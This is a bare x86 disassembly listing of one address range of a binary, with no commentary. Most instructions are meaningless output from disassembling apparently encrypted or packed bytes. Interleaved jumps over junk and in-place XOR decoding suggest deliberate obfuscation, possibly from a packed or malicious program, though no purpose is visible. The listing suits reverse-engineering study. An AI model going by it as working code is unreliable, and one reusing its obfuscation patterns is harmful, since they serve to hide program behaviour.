  402909:	mov    cl,0x82
  40290b:	add    BYTE PTR [edx+0x24],al
  40290e:	int3   
  40290f:	aas    
  402910:	jns    0x4028ab
  402912:	mov    ds:0x9730870,al
  402917:	out    dx,al
  402918:	ja     0x4028bb
  40291a:	out    0xfe,eax
  40291c:	lea    ecx,[eax-0x2a]
  40291f:	push   esp
  402920:	fbld   TBYTE PTR [eax]
  402923:	and    BYTE PTR [ebp+0x5b005468],dl
  402929:	jne    0x4028d4
  40292b:	add    ecx,DWORD PTR [edx+0x242c3cbc]
  402931:	nop    DWORD PTR [edi+ecx*4-0x6ed9d191]
  402939:	xor    DWORD PTR cs:[ebp+0x2d677288],edx
  402940:	stc    
  402941:	dec    eax
  402942:	ss jmp 0xd805:0x51f75dfa
  40294a:	mov    bl,0x99
  40294c:	or     BYTE PTR [ebx-0x23],bl
  40294f:	mov    ds:0x61c6b704,al
  402954:	mov    edx,0x3a62bb
  402959:	add    dl,BYTE PTR [edx+eiz*4-0x7b]
  40295d:	cmp    esp,ecx
  40295f:	arpl   WORD PTR [edi],ax
  402961:	scas   eax,DWORD PTR es:[edi]
  402962:	sbb    BYTE PTR ds:[edx+edi*4-0x34033d56],dl
  40296a:	test   eax,0x14e70589
  40296f:	and    ch,ah
  402971:	inc    ebx
  402972:	adc    dl,BYTE PTR [edi]
  402974:	fst    DWORD PTR [eax+0x7ca026ac]
  40297a:	repnz or BYTE PTR [esp+ebx*8],ch
  40297e:	inc    esp
  40297f:	leave  
  402980:	into   
  402981:	in     eax,dx
  402982:	cs stos BYTE PTR es:[edi],al
  402984:	mov    ds:0x3c0c4857,al
  402989:	scas   eax,DWORD PTR es:[edi]
  40298a:	addr16 jo 0x4029cd
  40298d:	ins    DWORD PTR es:[edi],dx
  40298e:	call   0xe7254f12
  402993:	sahf   
  402994:	pop    ecx
  402995:	dec    esp
  402996:	mov    ch,0x9a
  402998:	lods   eax,DWORD PTR ds:[esi]
  402999:	fisubr WORD PTR cs:[ecx+edx*1]
  40299d:	cmp    eax,0xa5c2e1d3
  4029a2:	imul   edi,DWORD PTR [ebx-0x3b34a8eb],0xffffffc6
  4029a9:	sbb    DWORD PTR [eax+0x5a],edi
  4029ac:	out    dx,eax
  4029ad:	iret   
  4029ae:	test   DWORD PTR [ebp-0x11],eax
  4029b1:	inc    edx
  4029b2:	sub    dh,BYTE PTR [edi+0x50]
  4029b5:	fimul  DWORD PTR [ecx]
  4029b7:	xor    dh,BYTE PTR [edx+eax*2]
  4029ba:	frstor [ebx+0x59]
  4029bd:	inc    ebx
  4029be:	cmp    dh,ch
  4029c0:	hlt    
  4029c1:	stos   BYTE PTR es:[edi],al
  4029c2:	push   edi
  4029c3:	pop    esi
  4029c4:	cmp    ch,ch
  4029c6:	aas    
  4029c7:	std    
  4029c8:	jmp    0x453f8d96
  4029cd:	pop    eax
  4029ce:	cmp    eax,0x16870b8d
  4029d3:	or     bl,bh
  4029d5:	jno    0x4029f2
  4029d7:	je     0x4029af
  4029d9:	mov    WORD PTR [esi-0x72c6de23],gs
  4029df:	into   
  4029e0:	test   edx,edi
  4029e2:	sbb    al,0x44
  4029e4:	adc    bl,BYTE PTR [esi-0x70]
  4029e7:	cmp    ecx,ecx
  4029e9:	pop    ds
  4029ea:	jl     0x402a43
  4029ec:	dec    ebp
  4029ed:	add    eax,0xad7f387b
  4029f2:	mov    dl,0xed
  4029f4:	retfw  0x2808
  4029f8:	or     dh,BYTE PTR [eax-0xc091680]
  4029fe:	xchg   esp,eax
  4029ff:	xor    eax,0x2a8c0be2
  402a04:	ins    DWORD PTR es:[edi],dx
  402a05:	mov    bh,0x4d
  402a07:	push   es
  402a08:	mov    ds:0x5119e221,al
  402a0d:	dec    esp
  402a0e:	adc    eax,ebp
  402a10:	and    esp,DWORD PTR [esi-0x64]
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	gs loope 0x4029b9
  402a37:	push   ds
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	sub    dl,BYTE PTR ds:[ebp+0x21d92ddf]
  402a47:	and    eax,edi
  402a49:	test   BYTE PTR [ebp+0x2d],bl
  402a4c:	push   edx
  402a4d:	mov    ecx,0x4ef2f9b6
  402a52:	out    0x50,eax
  402a54:	sub    DWORD PTR [ebx+0x21c70cd8],edi
  402a5a:	sub    ebx,0xc88416c0
  402a60:	fstp   DWORD PTR [edx+0x2bd3fcb9]
  402a66:	test   al,0xf0
  402a68:	push   es
  402a69:	popf   
  402a6a:	push   edx
  402a6b:	sbb    DWORD PTR [ebp+0x2d],edi
  402a6e:	(bad)  
  402a6f:	repz cmp edi,DWORD PTR [ecx]
  402a72:	shr    BYTE PTR [ecx+0x6a917354],1
  402a78:	push   ds
  402a79:	loope  0x402aab
  402a7b:	cmp    BYTE PTR [ecx],ch
  402a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a7e:	jmp    0x99e3:0x9257ad7e
  402a85:	push   edi
  402a86:	addr16 pusha 
  402a88:	push   0x4ae13fe3
  402a8d:	call   0x3a3:0xed949398
  402a94:	sub    DWORD PTR [ecx-0x7c],0xc1ad3453
  402a9b:	xor    bl,BYTE PTR [ecx]
  402a9d:	cdq    
  402a9e:	xor    esi,ebx
  402aa0:	jnp    0x402afe
  402aa2:	out    0xa2,eax
  402aa4:	jecxz  0x402ab1
  402aa6:	in     eax,0xb7
  402aa8:	clc    
  402aa9:	in     al,dx
  402aaa:	rcl    BYTE PTR [esi+0x2dcc1e0],0xa3
  402ab1:	ud0    ebp,DWORD PTR [ebp+0x66]
  402ab5:	push   ebp
  402ab6:	fcomi  st,st(7)
  402ab8:	data16 jns 0x402ae3
  402abb:	dec    dh
  402abd:	dec    esi
  402abe:	jp     0x402a53
  402ac0:	ds nop
  402ac2:	cmp    eax,0x70c27adc
  402ac7:	sub    BYTE PTR [edx],ch
  402ac9:	ds dec ecx
  402acb:	dec    ebp
  402acc:	mov    esi,0x57b4f3aa
  402ad1:	push   0x446e7b45
  402ad6:	adc    ah,BYTE PTR [edi]
  402ad8:	xchg   ecx,eax
  402ad9:	jbe    0x402a7c
  402adb:	pop    ss
  402adc:	stc    
  402add:	xchg   ecx,eax
  402ade:	out    0x35,eax
  402ae0:	push   edx
  402ae1:	in     al,dx
  402ae2:	ret    0x418b
  402ae5:	jo     0x402a69
  402ae7:	pop    eax
  402ae8:	inc    eax
  402ae9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  402aeb:	int3   
  402aec:	push   ss
  402aed:	test   DWORD PTR [esi],esi
  402aef:	xor    edi,DWORD PTR [edx+0x81bd02c]
  402af5:	dec    BYTE PTR [ebx]
  402af7:	cdq    
  402af8:	aam    0x53
  402afa:	clc    
  402afb:	xor    cl,cl
  402afd:	pusha  
  402afe:	cmp    eax,0xc9a913dd
  402b03:	add    edi,esp
  402b05:	cmp    bh,BYTE PTR [ebp+0x38]
  402b08:	fist   DWORD PTR [edx+0x12]
  402b0b:	sar    DWORD PTR [ebx],cl
  402b0d:	loope  0x402b2c
  402b0f:	push   es
  402b10:	std    
  402b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b12:	scas   al,BYTE PTR es:[edi]
  402b13:	daa    
  402b14:	xchg   ecx,eax
  402b15:	xor    eax,0xcdd08c40
  402b1a:	dec    edx
  402b1b:	scas   eax,DWORD PTR es:[edi]
  402b1c:	jno    0x402acd
  402b1e:	xchg   esi,eax
  402b1f:	mov    cl,BYTE PTR [esi-0xd]
  402b22:	adc    DWORD PTR [edi+ebp*8],edx
  402b25:	adc    cl,bl
  402b27:	jno    0x402b48
  402b29:	add    ah,BYTE PTR [edx-0x34]
  402b2c:	and    BYTE PTR [eax+0x6ccb03c5],bh
  402b32:	push   esp
  402b33:	adc    BYTE PTR [ecx+0x42],bl
  402b36:	mov    BYTE PTR [ebx+0x43],0xd7
  402b3a:	cdq    
  402b3b:	scas   al,BYTE PTR es:[edi]
  402b3c:	sub    eax,0xd9258945
  402b41:	ror    DWORD PTR [esi-0x35dd49c9],0xb2
  402b48:	xlat   BYTE PTR ds:[ebx]
  402b49:	sbb    BYTE PTR [ebx+0x2e],0x8b
  402b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4e:	mov    dl,0x45
  402b50:	mov    esp,0xcde330f8
  402b55:	les    esp,FWORD PTR [edi+0x14f1eb89]
  402b5b:	(bad)  
  402b5c:	pop    ds
  402b5d:	xchg   esp,eax
  402b5e:	adc    edx,DWORD PTR [ecx+eax*2]
  402b61:	mov    esp,?
  402b63:	icebp  
  402b64:	add    DWORD PTR [esi+0x7c],esp
  402b67:	or     eax,0xb1aa04fb
  402b6c:	fidivr WORD PTR [esi]
  402b6e:	cmp    al,0x78
  402b70:	lahf   
  402b71:	lock js 0x402b31
  402b74:	or     DWORD PTR [edi-0x7d1bf993],0xffffffaa
  402b7b:	xor    eax,0xa2313768
  402b80:	push   edx
  402b81:	mov    al,0xd
  402b83:	outs   dx,DWORD PTR ds:[esi]
  402b84:	add    al,0x9f
  402b86:	xchg   edx,eax
  402b87:	cmp    eax,0x5680d2e2
  402b8c:	pop    ss
  402b8d:	pusha  
  402b8e:	call   FWORD PTR [edi]
  402b90:	or     esp,ecx
  402b92:	nop
  402b93:	adc    BYTE PTR [esi],ch
  402b95:	sub    esi,DWORD PTR [edx]
  402b97:	bound  ecx,QWORD PTR ds:0x92bd4d02
  402b9d:	loope  0x402b4d
  402b9f:	xchg   esp,eax
  402ba0:	jb     0x402b8a
  402ba2:	dec    esi
  402ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba4:	or     dl,BYTE PTR [eax+0x39ab8903]
  402baa:	jo     0x402c14
  402bac:	mov    bl,0xa1
  402bae:	jnp    0x402bac
  402bb0:	push   ecx
  402bb1:	imul   eax,DWORD PTR [di],0xa581fab6
  402bb8:	push   edx
  402bb9:	sub    BYTE PTR [ebx-0x5f7810ac],ch
  402bbf:	xor    al,0x90
  402bc1:	pop    ss
  402bc2:	cmp    eax,DWORD PTR [esi-0x7bf03f7b]
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	mov    cl,0xf8
  402c13:	stos   BYTE PTR es:[edi],al
  402c14:	shl    DWORD PTR [esi],0xb
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bbc
  402c1e:	sub    eax,0x54c7bb0c
  402c23:	mov    ch,BYTE PTR [eax-0x4a]
  402c26:	mov    ecx,0x2fd50869
  402c2b:	retf   
  402c2c:	stos   DWORD PTR es:[edi],eax
  402c2d:	daa    
  402c2e:	sub    ch,ah
  402c30:	mov    bh,0x75
  402c32:	test   DWORD PTR [eax],edx
  402c34:	sub    cl,ch
  402c36:	dec    edi
  402c37:	outs   dx,DWORD PTR ds:[esi]
  402c38:	retf   
  402c39:	mov    edi,0xa3972a03
  402c3e:	push   edi
  402c3f:	inc    eax
  402c40:	loop   0x402c5f
  402c42:	pop    ebp
  402c43:	jl     0x402c7c
  402c45:	mov    ebp,0xa2bca88
  402c4a:	mov    esi,gs
  402c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c4d:	in     eax,0x74
  402c4f:	dec    esi
  402c50:	das    
  402c51:	inc    eax
  402c52:	dec    BYTE PTR [eax+0x47447524]
  402c58:	add    eax,0xe9d10f64
  402c5d:	aas    
  402c5e:	les    esp,FWORD PTR [ebp-0x52]
  402c61:	mov    ecx,edx
  402c63:	sbb    dh,BYTE PTR [ecx]
  402c65:	(bad)  
  402c66:	ror    ebx,0x6e
  402c69:	je     0x402c52
  402c6b:	sbb    BYTE PTR [edi-0x24],0x92
  402c6f:	mov    ebp,0xa9f8fb8e
  402c74:	cli    
  402c75:	pop    ss
  402c76:	sbb    eax,edi
  402c78:	popa   
  402c79:	sbb    edx,DWORD PTR [ebx+0x4c]
  402c7c:	pop    edi
  402c7d:	bound  ebx,QWORD PTR [ecx-0x4d]
  402c80:	jne    0x402cb5
  402c82:	mov    edi,0xbfaab382
  402c87:	mov    eax,0xf67a5ee5
  402c8c:	jbe    0x402cc8
  402c8e:	and    cl,cl
  402c90:	or     BYTE PTR [ebx+ebp*4-0x41],bl
  402c94:	jnp    0x402cbd
  402c96:	xor    al,0xcd
  402c98:	jmp    0x402d14
  402c9a:	cmp    DWORD PTR [ebx-0x2334444e],esp
  402ca0:	sahf   
  402ca1:	fst    QWORD PTR [ebx-0x43]
  402ca4:	or     BYTE PTR [esp+ebx*2+0x74],cl
  402ca8:	arpl   WORD PTR [edi],dx
  402caa:	retf   
  402cab:	retf   0x8df0
  402cae:	add    al,0x83
  402cb0:	loope  0x402c65
  402cb2:	and    ebp,DWORD PTR [esi]
  402cb4:	cmc    
  402cb5:	int    0xfd
  402cb7:	cmp    DWORD PTR [edx],esp
  402cb9:	sub    ecx,DWORD PTR [ecx+0x35]
  402cbc:	imul   esi,edx,0x8dda2b39
  402cc2:	in     al,0xe5
  402cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc5:	push   edi
  402cc6:	pushf  
  402cc7:	sti    
  402cc8:	or     al,0x12
  402cca:	or     DWORD PTR [eax+0x5],edx
  402ccd:	mov    bl,0xc6
  402ccf:	cmp    eax,0x350a7a5
  402cd4:	outs   dx,DWORD PTR ds:[esi]
  402cd5:	in     eax,dx
  402cd6:	adc    eax,0x2d330ca3
  402cdb:	lahf   
  402cdc:	or     eax,0xda386d09
  402ce1:	cmp    DWORD PTR ds:[ebp+0x39bef477],ecx
  402ce8:	ror    bh,1
  402cea:	sub    DWORD PTR [edx+0x34bd3e5c],esi
  402cf0:	jecxz  0x402ccc
  402cf2:	shl    BYTE PTR [edx-0x3bc41526],cl
  402cf8:	or     BYTE PTR [edi+edx*1],0x55
  402cfc:	fimul  WORD PTR [edi+0x1]
  402cff:	inc    BYTE PTR [edi-0xc1294b5]
  402d05:	in     al,dx
  402d06:	mov    cl,0x32
  402d08:	push   ebx
  402d09:	cld    
  402d0a:	mov    ch,0x4b
  402d0c:	mov    ?,WORD PTR [eax-0x3a6f8994]
  402d12:	dec    ebp
  402d13:	mov    esi,0xa4052dd2
  402d18:	cmp    dl,BYTE PTR ds:0x5d93dd4b
  402d1e:	mov    ebx,0xd5743c82
  402d23:	std    
  402d24:	int3   
  402d25:	shr    DWORD PTR [edx-0x3e],1
  402d28:	jns    0x402cf1
  402d2a:	push   ecx
  402d2b:	ins    BYTE PTR es:[edi],dx
  402d2c:	in     al,0x98
  402d2e:	fidiv  DWORD PTR [ecx]
  402d30:	inc    esi
  402d31:	std    
  402d32:	ins    DWORD PTR es:[edi],dx
  402d33:	jnp    0x402dad
  402d35:	int    0x73
  402d37:	fldenv [edx+0x22]
  402d3a:	mov    dl,dh
  402d3c:	neg    ebx
  402d3e:	das    
  402d3f:	dec    edi
  402d40:	jns    0x402d3a
  402d42:	jne    0x402d3d
  402d44:	jb     0x402da0
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	mov    DWORD PTR [ecx+0x281c5a95],edx
  402d4d:	shl    BYTE PTR [ebx+edi*1],0x23
  402d51:	dec    ecx
  402d52:	xchg   esp,eax
  402d53:	jnp    0x402d90
  402d55:	mov    dl,0x5a
  402d57:	mov    al,0xfd
  402d59:	or     dl,BYTE PTR [esi]
  402d5b:	ret    
  402d5c:	fcos   
  402d5e:	retf   0xc8bf
  402d61:	addr16 je 0x402dc7
  402d64:	nop
  402d65:	adc    eax,edx
  402d67:	iret   
  402d68:	mov    dl,BYTE PTR [edx-0x710bd525]
  402d6e:	mov    dl,0xf4
  402d70:	xor    esp,DWORD PTR [esi+0x26]
  402d73:	push   edx
  402d74:	mov    ds:0xc57d121d,eax
  402d79:	test   DWORD PTR [eax],ebp
  402d7b:	sti    
  402d7c:	and    ebx,ebx
  402d7e:	add    BYTE PTR ds:0x472f39e6,cl
  402d84:	mov    eax,0xc93a7fb7
  402d89:	inc    edx
  402d8a:	loop   0x402dfb
  402d8c:	push   0x17
  402d8e:	xchg   esi,eax
  402d8f:	mov    DWORD PTR [esi+0x40a59a0f],edi
  402d95:	or     ch,dl
  402d97:	mov    ebp,0xd9c164f0
  402d9c:	mov    ecx,0xe6f0c646
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [esp+eiz*2-0x62],1
  402de7:	call   0x7e48e05b
  402dec:	jle    0x402de8
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e5e
  402df2:	xchg   esi,eax
  402df3:	pop    esi
  402df4:	jmp    0xa82a4317
  402df9:	iret   
  402dfa:	je     0x402e48
  402dfc:	xor    eax,0x5fc33cb1
  402e01:	jbe    0x402dd7
  402e03:	retf   
  402e04:	stos   BYTE PTR es:[edi],al
  402e05:	pop    esp
  402e06:	cmp    eax,0xe0b89515
  402e0b:	jge    0x402d99
  402e0d:	cmp    edi,DWORD PTR [ebx]
  402e0f:	and    al,0x82
  402e11:	add    DWORD PTR [ecx],ecx
  402e13:	and    eax,0x5ca19725
  402e18:	mov    dl,0x91
  402e1a:	mov    eax,DWORD PTR [ebx]
  402e1c:	gs fs fadd st(7),st
  402e20:	jp     0x402e8c
  402e22:	cmp    al,0x35
  402e24:	xor    eax,DWORD PTR [esi+0x47]
  402e27:	repnz leave 
  402e29:	mov    dl,0x1b
  402e2b:	cmp    eax,DWORD PTR [esi+0x57]
  402e2e:	adc    eax,0x1e2e8144
  402e33:	std    
  402e34:	mov    edi,0x1b6758a6
  402e39:	(bad)  
  402e3a:	stos   DWORD PTR es:[edi],eax
  402e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e3c:	int3   
  402e3d:	arpl   WORD PTR [ecx+0x5426c882],sp
  402e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e44:	sub    dl,ah
  402e46:	and    dl,bl
  402e48:	sar    edi,0x1
  402e4b:	push   ecx
  402e4c:	and    bh,BYTE PTR [esi]
  402e4e:	xabort 0x4b
  402e51:	mov    dh,0x12
  402e53:	test   al,0x21
  402e55:	add    al,0x23
  402e57:	adc    cl,ch
  402e59:	sbb    ecx,DWORD PTR [edx+0x376455d5]
  402e5f:	pushf  
  402e60:	popf   
  402e61:	mov    al,cl
  402e63:	mov    ah,0x79
  402e65:	(bad)  [edx]
  402e67:	xchg   edi,eax
  402e68:	jbe    0x402e73
  402e6a:	push   0x7e
  402e6c:	push   ss
  402e6d:	and    ah,BYTE PTR [eax+0x5c90b1f4]
  402e73:	into   
  402e74:	and    ebx,DWORD PTR [ebp-0x1b568a51]
  402e7a:	shl    BYTE PTR [ebp+0x7c],cl
  402e7d:	jmp    0x636ea58e
  402e82:	dec    esi
  402e83:	mov    edx,0xf771ee85
  402e88:	inc    eax
  402e89:	mov    al,0x19
  402e8b:	mov    edx,0xdde5f8d8
  402e90:	popf   
  402e91:	xchg   edx,eax
  402e92:	ret    
  402e93:	xor    esi,ebx
  402e95:	call   0x60e07198
  402e9a:	adc    ecx,DWORD PTR [edi]
  402e9c:	adc    edi,DWORD PTR [ebx+0xc4f3f76]
  402ea2:	cs fcmovbe st,st(2)
  402ea5:	cs aad 0xe9
  402ea8:	pop    ebx
  402ea9:	jns    0x402e4b
  402eab:	loope  0x402e50
  402ead:	cmp    eax,0xf3d6823a
  402eb2:	cmp    eax,0x6cb8ffc5
  402eb7:	jne    0x402eb6
  402eb9:	mov    ?,ebp
  402ebb:	xchg   DWORD PTR [eax+esi*4+0x60],ebp
  402ebf:	mov    dl,BYTE PTR [ecx+0x7f405d85]
  402ec5:	outs   dx,BYTE PTR ds:[esi]
  402ec6:	stos   BYTE PTR es:[edi],al
  402ec7:	dec    ecx
  402ec8:	ret    
  402ec9:	pop    ecx
  402eca:	lock or edx,esp
  402ecd:	cmp    eax,0x2f670e2
  402ed2:	(bad)  
  402ed4:	jp     0x402e72
  402ed6:	sahf   
  402ed7:	ficomp WORD PTR [esi-0x111bc2ba]
  402edd:	push   ebx
  402ede:	dec    edi
  402edf:	jmp    0x402f26
  402ee1:	les    edi,FWORD PTR [edx+0x39]
  402ee4:	(bad)  
  402ee5:	mov    dl,0x92
  402ee7:	les    eax,FWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	sar    BYTE PTR [eax+ebx*4+0x68f48ce3],cl
  402ef1:	mov    bh,0xd4
  402ef3:	test   DWORD PTR [edi],ecx
  402ef5:	adc    al,0xa9
  402ef7:	pushf  
  402ef8:	test   BYTE PTR [ebx+edi*8-0x78],dl
  402efc:	fsubr  st,st(4)
  402efe:	xor    eax,0x7c1069a0
  402f03:	adc    eax,0xf92c1e62
  402f08:	cmp    al,0x22
  402f0a:	add    BYTE PTR [ebp-0x28],cl
  402f0d:	pop    esp
  402f0e:	(bad)  
  402f10:	mov    ecx,0x7aa4ae2e
  402f15:	push   ebp
  402f16:	jo     0x402f66
  402f18:	ja     0x402f3e
  402f1a:	cmp    ah,bl
  402f1c:	sub    dl,BYTE PTR [esi-0x20010bed]
  402f22:	sub    al,0x74
  402f24:	ss mov esp,0x88994627
  402f2a:	jecxz  0x402f7b
  402f2c:	mov    edi,0x38195da5
  402f31:	les    ebx,FWORD PTR [ecx-0x4c]
  402f34:	fs jmp 0x34fa:0xd5c9b4d0
  402f3c:	cs iret 
  402f3e:	dec    ebp
  402f3f:	aam    0x11
  402f41:	inc    edx
  402f42:	xor    bh,bh
  402f44:	(bad)  
  402f45:	pop    ss
  402f46:	dec    eax
  402f47:	jbe    0x402ef1
  402f49:	out    0xd5,al
  402f4b:	outs   dx,BYTE PTR ds:[esi]
  402f4c:	jl     0x402f09
  402f4e:	push   es
  402f4f:	std    
  402f50:	ror    cl,cl
  402f52:	sbb    eax,0x27023a2
  402f57:	add    al,BYTE PTR [esi+0x5e3f1e23]
  402f5d:	or     ecx,DWORD PTR [edx+0x35b60384]
  402f63:	scas   al,BYTE PTR es:[edi]
  402f64:	(bad)  
  402f65:	pushf  
  402f66:	sbb    ecx,edx
  402f68:	ret    0x9df0
  402f6b:	inc    ebp
  402f6c:	and    ebx,DWORD PTR es:0x23895b75
  402f73:	stos   BYTE PTR es:[edi],al
  402f74:	mov    bl,0x8d
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x7d405a49]
  402fae:	dec    ecx
  402faf:	scas   eax,DWORD PTR es:[edi]
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fb3
  402fb9:	dec    ebp
  402fba:	push   edi
  402fbb:	aad    0xf8
  402fbd:	pop    DWORD PTR [eax+0x52de03c2]
  402fc3:	int    0x71
  402fc5:	fs push esp
  402fc7:	clc    
  402fc8:	fimul  WORD PTR [ebp+0x6]
  402fcb:	bound  ebx,QWORD PTR [ebx+0xc243839]
  402fd1:	jo     0x40301b
  402fd3:	xor    ebx,0xf
  402fd6:	xor    ebp,DWORD PTR [edi+0x3f]
  402fd9:	pop    ecx
  402fda:	push   ecx
  402fdb:	(bad)  
  402fdc:	loopne 0x40302f
  402fde:	aas    
  402fdf:	stc    
  402fe0:	add    DWORD PTR [ecx+0x465daf79],edx
  402fe6:	in     eax,0xee
  402fe8:	xor    eax,0x40987f88
  402fed:	jno    0x402fe5
  402fef:	data16 rol BYTE PTR [ecx],0xb5
  402ff3:	retf   0x784d
  402ff6:	enter  0x2882,0x4f
  402ffa:	ins    BYTE PTR es:[edi],dx
  402ffb:	adc    al,BYTE PTR [eax+edx*4-0x781a6d27]
  403002:	sar    DWORD PTR [edi+0x10],0x1e
  403006:	sar    DWORD PTR [ebx],cl
  403008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403009:	push   ecx
  40300a:	fidivr DWORD PTR [eax-0x14aea80c]
  403010:	and    bh,cl
  403012:	and    bl,ah
  403014:	outs   dx,BYTE PTR ds:[esi]
  403015:	dec    ebp
  403016:	jle    0x403080
  403018:	clc    
  403019:	inc    ecx
  40301a:	xlat   BYTE PTR ds:[ebx]
  40301b:	shl    BYTE PTR [edx],0x5e
  40301e:	mov    eax,ds:0x348d5ad8
  403023:	sbb    cl,BYTE PTR [esi+0x7a]
  403026:	mov    esp,0x384610cf
  40302b:	rcl    DWORD PTR [esi+0xe],0x2d
  40302f:	xor    al,dh
  403031:	or     al,0x87
  403033:	mov    esi,0xab8fd088
  403038:	fld    TBYTE PTR [ecx]
  40303a:	adc    eax,ebp
  40303c:	push   ss
  40303d:	loop   0x403096
  40303f:	dec    edi
  403040:	stc    
  403041:	inc    edi
  403042:	in     al,dx
  403043:	cmp    eax,0x2f227038
  403048:	stos   BYTE PTR es:[edi],al
  403049:	pop    esi
  40304a:	inc    ebp
  40304b:	adc    al,0xb7
  40304d:	sbb    DWORD PTR [ebx],esp
  40304f:	ret    
  403050:	xor    dh,BYTE PTR [ebx-0x2e]
  403053:	adc    eax,0x59577a10
  403058:	loopne 0x40302a
  40305a:	jle    0x4030bb
  40305c:	xchg   esi,eax
  40305d:	iret   
  40305e:	mov    edx,0x587b9a8f
  403063:	mov    ebx,0x9f23853b
  403068:	mov    edx,0x704a7d0f
  40306d:	(bad)  
  40306e:	cmp    DWORD PTR [esi+0x274c24fa],ecx
  403074:	std    
  403075:	inc    ebx
  403076:	mov    cs,WORD PTR [ecx+eiz*1+0x5f6d4f78]
  40307d:	sub    edi,DWORD PTR [edi+eiz*2+0x7daaa826]
  403084:	icebp  
  403085:	dec    ebp
  403086:	fldenv [esi]
  403088:	ins    DWORD PTR es:[edi],dx
  403089:	das    
  40308a:	test   eax,0x8193431e
  40308f:	inc    ecx
  403090:	lahf   
  403091:	xchg   esi,eax
  403092:	adc    ecx,DWORD PTR [edi-0x548d9d95]
  403098:	popa   
  403099:	jmp    0xf9a3:0x49e8e46
  4030a0:	bnd jb 0x4030d9
  4030a3:	inc    eax
  4030a4:	nop
  4030a5:	fwait
  4030a6:	inc    edi
  4030a7:	jno    0x40305e
  4030a9:	pop    es
  4030aa:	loope  0x40308c
  4030ac:	or     DWORD PTR [edx+0x46573085],ebx
  4030b2:	jne    0x4030b3
  4030b4:	push   0xe67a640a
  4030b9:	add    esi,DWORD PTR [esp+edi*4]
  4030bc:	imul   esp,ebx,0x4c58b226
  4030c2:	mov    ecx,0x9fe3447b
  4030c7:	gs mov eax,cs:0x34e9a7a4
  4030ce:	loopne 0x4030f2
  4030d0:	push   edx
  4030d1:	push   edi
  4030d2:	mov    edx,0x7f235a4b
  4030d7:	in     al,dx
  4030d8:	(bad)  
  4030da:	mov    eax,ds:0xc58a68be
  4030df:	inc    eax
